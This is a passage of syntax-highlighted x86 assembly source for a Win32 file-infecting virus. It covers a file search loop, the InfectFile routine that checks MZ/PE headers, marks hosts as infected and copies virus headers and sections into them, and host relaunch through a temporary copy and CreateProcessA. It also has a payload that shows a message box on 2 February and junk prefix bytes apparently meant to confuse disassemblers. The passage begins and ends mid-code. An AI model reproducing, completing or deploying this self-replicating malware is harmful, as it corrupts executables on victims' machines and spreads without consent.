    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">Try_Next</span><span class="sc0">                      </span><span class="sc1">;can't set attributes, try next</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">                       </span><span class="sc1">;open and map file</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">Try_Next</span><span class="sc0">                      </span><span class="sc1">;cant map file, try next</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">                     </span><span class="sc1">;infect file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EVA'</span><span class="sc0">                      </span><span class="sc1">;infection OK ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_search</span><span class="sc0">                      </span><span class="sc1">;no, try next</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">                    </span><span class="sc1">;unmap view of file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hMapFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">                    </span><span class="sc1">;close file mapping object</span><span class="sc0">


    </span><span class="sc1">;error, we MUST TRUNCATE FILE BACK !</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">win32_find_data.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0">                 </span><span class="sc1">;set file pointer to original size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc0">                   </span><span class="sc1">;and truncate file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">end_OpenFile3</span><span class="sc0">                  </span><span class="sc1">;close file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Try_Next</span><span class="sc0">                        </span><span class="sc1">;try next file</span><span class="sc0">

</span><span class="sc5">exit_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">                      </span><span class="sc1">;close and unmap file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MyClose</span><span class="sc0">                        </span><span class="sc1">;close and unmap my file</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">win32_find_data.WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win32_find_data.WFD_szFileName</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">                 </span><span class="sc1">;set back file attributes</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">search_handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">                      </span><span class="sc1">;close search handle</span><span class="sc0">

</span><span class="sc5">quit_to_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpSystemTime</span><span class="sc0">                </span><span class="sc1">;test for activate payload</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">                  </span><span class="sc1">;get system time</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;ecx = 2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpSystemTime</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">;is February ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpSystemTime</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">;is 2nd of February</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpSystemTime</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;2 seconds ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                      </span><span class="sc1">;system modal window</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgTitle</span><span class="sc0">                    </span><span class="sc1">;title</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgText</span><span class="sc0">                 </span><span class="sc1">;test</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;owner - NULL</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">                    </span><span class="sc1">;display bessage box</span><span class="sc0">

</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;overwrite file, if exist already</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DestFile</span><span class="sc0">                    </span><span class="sc1">;destination file</span><span class="sc0">
</span><span class="sc5">cpyf</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpFileName</span><span class="sc0">                  </span><span class="sc1">;source file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                      </span><span class="sc1">;copy file</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;error ? (disk full, for example)</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getcommandline</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetLastError</span><span class="sc0">                   </span><span class="sc1">;get las error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">                     </span><span class="sc1">;another process is using this file</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                        </span><span class="sc1">;unknown error, exit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;everwrite file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DestFile</span><span class="sc0">                </span><span class="sc1">;dest. file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;try generate another file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cpyf</span><span class="sc0">                        </span><span class="sc1">;and try to copy file again</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">                          </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">getcommandline</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;now we will skip our filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">                    </span><span class="sc1">;get command line</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;set source</span><span class="sc0">
</span><span class="sc5">cat</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;get char</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;no params ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">run_prg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">                     </span><span class="sc1">;long files r written with ""s</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">long_name</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                     </span><span class="sc1">;is it space ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cat</span><span class="sc0">

</span><span class="sc5">cat1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CmdLine</span><span class="sc0">                 </span><span class="sc1">;destination</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;movsb with char in al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;end of params ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">run_prg</span><span class="sc0">

</span><span class="sc5">cat0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;same as previous</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cat0</span><span class="sc0">

</span><span class="sc5">run_prg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DestFile</span><span class="sc0">                </span><span class="sc1">;edx as file to param</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">win32_find_data.WFD_nFileSizeLow</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2048</span><span class="sc0">      </span><span class="sc1">;save num. of bytes to map</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">                       </span><span class="sc1">;open and map our file</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">                      </span><span class="sc1">;if error, quit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;load oroginal MZ_lfanew</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;and save it to that original pos.</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">                      </span><span class="sc1">;close and unmap file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">space</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                    </span><span class="sc1">;add params</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lppiProcInfo</span><span class="sc0">                </span><span class="sc1">;procinfo</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpsiStartInfo</span><span class="sc0">               </span><span class="sc1">;start info</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpsiStartInfo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">lpsiStartInfo</span><span class="sc0">         </span><span class="sc1">;size of start info</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;enviroment</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;create options</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;inherit handles ?</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;thread SA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;process SA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DestFile</span><span class="sc0">                    </span><span class="sc1">;command line</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;app name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0">                 </span><span class="sc1">;create process !</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">                      </span><span class="sc1">;if error, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                         </span><span class="sc1">;infinite</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hProcess</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;child process</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc0">                </span><span class="sc1">;wait for signaled state</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hThread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">                    </span><span class="sc1">;close thread primary thread handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hProcess</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">                    </span><span class="sc1">;close process handle</span><span class="sc0">

</span><span class="sc5">end_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DestFile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;file to delete</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">space</span><span class="sc4">-</span><span class="sc5">DestFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;add NULL between file and params</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc0">                    </span><span class="sc1">;delete it !</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">                           </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                         </span><span class="sc1">;otherwise this quit metod will not work !</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">                          </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">long_name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;load char</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">long_name</span><span class="sc0">                       </span><span class="sc1">;wait for next "</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cat1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">                          </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;save address of MM-file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">         </span><span class="sc1">;must be MZ</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;mustn't be infected already</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">         </span><span class="sc1">;must be PE\0\0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">    </span><span class="sc1">;must be 386+</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">                  </span><span class="sc1">;must be executable, mustn't be DLL</span><span class="sc0">

</span><span class="sc1">;at this point: </span><span class="sc0">
</span><span class="sc1">;   EBX -   start of MM-file</span><span class="sc0">
</span><span class="sc1">;   ECX -   PE header of MM-file</span><span class="sc0">

    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">;save original MZ_lfanew</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">win32_find_data.WFD_nFileSizeLow</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">;push it, will be needed l8r</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MyOpen</span><span class="sc0">                     </span><span class="sc1">;open and map me</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">                    </span><span class="sc1">;can't open, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">503</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;PE header size + section header size</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">               </span><span class="sc1">;copy PE header + all section headers</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">


</span><span class="sc1">;at this point:</span><span class="sc0">
</span><span class="sc1">;   EDX -   start of our new PE header</span><span class="sc0">
</span><span class="sc1">;   EBP -   start of MM-file (MZ header)</span><span class="sc0">
</span><span class="sc1">;   ESI -   start of MM prg+virus (MZ header)</span><span class="sc0">
</span><span class="sc1">;   EDI -   pointer to memory, where will be copied virus sections</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc1">;from ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;size of optional header</span><span class="sc0">

    </span><span class="sc1">;to ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
